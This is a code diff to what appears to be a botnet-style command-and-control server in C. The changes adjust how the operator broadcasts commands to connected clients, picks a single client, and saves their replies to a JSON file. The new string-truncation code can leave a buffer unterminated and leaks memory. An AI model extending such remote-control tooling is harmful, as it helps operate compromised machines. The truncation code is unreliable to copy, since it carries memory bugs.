@@ -13,7 +13,7 @@ TODO:
 #include <pthread.h>
 #include <stdio.h>
 #include <sys/select.h>
-#include "json-c/json.h"
+#include <json-c/json.h>
 #include <time.h>
 
 
@@ -170,6 +170,7 @@ void *bot_command(void *arg)
 {
 
     char data[1024];
+    char json[4];
     int rc = 0;
 
     connection *head = (connection *)arg;
@@ -211,7 +212,7 @@ void *bot_command(void *arg)
             // Iterate through array and print client information
             while (tmp != NULL)
             {
-                printf("[ID %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
+                printf("[ID: %d] [%s] [%s:%d]\n", i, tmp->hostname, tmp->dest_ip, tmp->dest_port);
                 tmp = tmp->next;
                 i++;
             }
@@ -290,11 +291,22 @@ void *bot_command(void *arg)
                         // Send data to client specified by user input, based on array index
                         tmp = head;
                         tmp = tmp->next;
+                        // Prompt user to print return in terminal or .json file
+                        printf("\nSend return output to .json file? y/N: ");
+                        fgets(json, sizeof(json), stdin);
+                        json[strcspn(json, "\n")] = 0;
                         while (tmp != NULL)
                         {
                             send(tmp->pfds->fd, data, sizeof(data), 0);
-                            // TODO: Limit the length of the data string below
-                            printf("[+] Sent %s to %s\n", data, tmp->hostname);
+                            // Limit the length of the data string
+                            char *trunc_data = malloc(24);
+                            strncpy(trunc_data, data, 20);
+                            if (strlen(data) > strlen(trunc_data))
+                            {
+                                strcat(trunc_data, "...");
+                            }
+                        
+                            printf("[+] Sent %s to %s\n", trunc_data, tmp->hostname);
 
                             // Wait for a response
                             char recieved_data[8192];
@@ -313,24 +325,14 @@ void *bot_command(void *arg)
 
                             // Data returned from client
                             recieved_data[bytes_recv] = '\0';
-
-                            // Prompt user to print return in terminal or .json file
-                            while (1) {
-                                printf("\nSend return output to .json file? y/N: ");
-                                fgets(data, sizeof(data), stdin);
-                                data[strcspn(data, "\n")] = 0;
-                                if (data[0] == 'y' || data[0] == 'Y') {
-                                    output_to_json(tmp, recieved_data, data);
-                                    break;
-                                }
-                                else if (data[0] == 'n' || data[0] == 'N') {
-                                    printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
-                                    break;
-                                }
-                                else {
-                                    continue;
-                                }
+                            if (json[0] == 'y' || json[0] == 'Y') {
+                                output_to_json(tmp, recieved_data, data);
                             }
+                            else
+                            {
+                                printf("[+] %s said: %s\n", tmp->hostname, recieved_data);
+                            }
+
                             tmp = tmp->next;
                         }
                     }
@@ -340,19 +342,19 @@ void *bot_command(void *arg)
                 else if (strcmp(data, "single") == 0)
                 {
                     // Prompt user for input, remove trailing newline and convert input to int
-                    printf("[Command][Single] Enter client: ");
+                    printf("[Command][Single] Enter client ID: ");
                     fgets(data, sizeof(data), stdin);
                     data[strcspn(data, "\n")] = 0;
                     int num = atoi(data);
                     if (strcmp(data, "back") == 0)
                     {
-                        break;
+                        continue;
                     }
 
                     // Sanitise user input
                     if (num < 1 || num > (count_connections(head) - 1))
                     {
-                        printf("[-] No such connection %d\n", num);
+                        printf("[-] No such connection %d. Use show to display client IDs.\n", num);
                         printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
                         continue;
                     }
@@ -642,9 +644,8 @@ void output_to_json(connection *client, char *dataRecieved, char *inputCmd)
         jsonFile = fopen("outputs.json", "w");
         fprintf(jsonFile, "%s", json_object_to_json_string(newJsonObject));
     }
-    // Close jsonFile and free
+    // Close jsonFile
     fclose(jsonFile);
-    free(jsonFile);
 }
 
 // Function to print welcome screen
